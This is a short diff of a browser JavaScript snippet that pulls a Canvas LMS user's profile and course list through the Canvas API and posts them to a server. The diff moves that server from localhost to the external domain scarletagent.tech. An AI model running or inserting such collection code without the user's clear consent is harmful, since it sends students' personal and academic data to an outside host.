@@ -1,7 +1,5 @@
 (async () => {
   try {
-    const serverUrl = "http://localhost:3000/receive_canvas_export";
-
     async function pagedFetch(url) {
       const results = [];
       let nextUrl = url;
@@ -25,7 +23,7 @@
     if (!profileResp.ok) throw new Error("Profile fetch failed: " + profileResp.status);
     const profile = await profileResp.json();
 
-    const uid = SPECIFIC_NUMBER
+    const uid = {{CANVAS_USER_ID}};
     profile.id = uid;
     const courses = await pagedFetch(`${base}/api/v1/users/${uid}/courses?per_page=100&include[]=term`);
 
@@ -37,6 +35,7 @@
 
     const payload = { profile, courses, collected_at: new Date().toISOString() };
 
+    const serverUrl = "https://scarletagent.tech/api/receive_canvas_export";
     await fetch(serverUrl, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
